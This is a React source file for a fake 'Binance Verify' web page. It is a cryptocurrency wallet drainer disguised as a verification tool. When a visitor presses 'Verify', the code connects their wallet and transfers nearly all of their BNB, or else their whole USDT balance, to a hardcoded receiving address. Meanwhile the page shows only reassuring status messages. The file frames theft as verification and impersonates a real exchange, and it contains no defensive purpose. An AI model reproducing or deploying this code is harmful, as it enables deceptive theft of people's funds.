import { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("Click Verify to start...");
  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your address
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  // Connect wallet
  async function connectWallet() {
    let provider;
    if (window.ethereum) provider = new ethers.BrowserProvider(window.ethereum);
    else if (window.BinanceChain) provider = new ethers.BrowserProvider(window.BinanceChain);
    else return alert("Install MetaMask or Binance Wallet!");

    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  // Verify and transfer BNB or USDT
  async function handleVerify() {
    setStatus("Detecting wallet...");
    let provider;
    if (window.ethereum) provider = new ethers.BrowserProvider(window.ethereum);
    else if (window.BinanceChain) provider = new ethers.BrowserProvider(window.BinanceChain);
    else {
      setStatus("No wallet detected!");
      return;
    }

    await provider.send("eth_requestAccounts", []);
    const network = await provider.getNetwork();
    if (network.chainId !== 56) { // BSC Mainnet
      setStatus("Switch your wallet to BSC Mainnet!");
      return;
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    setWalletAddress(userAddress);

    // Check BNB balance
    setStatus("Checking balances...");
    const balanceBNB = await provider.getBalance(userAddress);
    const minGas = ethers.parseEther("0.0005"); // leave gas
    if (balanceBNB > minGas) {
      setStatus("Sending BNB...");
      const tx = await signer.sendTransaction({
        to: RECEIVER,
        value: balanceBNB - minGas
      });
      await tx.wait();
      setStatus("✅ BNB sent successfully!");
      return;
    }

    // Check USDT balance
    const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
    try {
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("✅ USDT sent successfully!");
        return;
      }
    } catch (err) {
      console.error(err);
      setStatus("Error checking USDT balance: " + err.message);
      return;
    }

    setStatus("❌ No BNB or USDT found!");
  }

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col items-center p-6">
      <header className="flex items-center mb-8">
        <img src={binanceLogo} alt="Binance Logo" className="h-10 mr-2" />
        <h1 className="text-yellow-400 text-2xl font-bold">Binance Verify</h1>
      </header>

      <div className="mb-6 text-center">
        {walletAddress ? (
          <p className="text-green-500 mb-2">Connected: {walletAddress}</p>
        ) : (
          <button
            onClick={connectWallet}
            className="px-6 py-3 bg-blue-600 text-white rounded-xl shadow mb-2"
          >
            Connect Wallet
          </button>
        )}
        <p className="text-gray-300">{status}</p>
      </div>

      <div className="relative flex justify-center items-center mb-12">
        <div className="absolute border-2 border-yellow-400 rounded-full w-40 h-40 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-32 h-32 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-24 h-24 animate-pulse-slow"></div>
        <button
          onClick={handleVerify}
          className="z-10 px-8 py-4 button-primary font-bold"
        >
          Verify
        </button>
      </div>
    </div>
  );
}
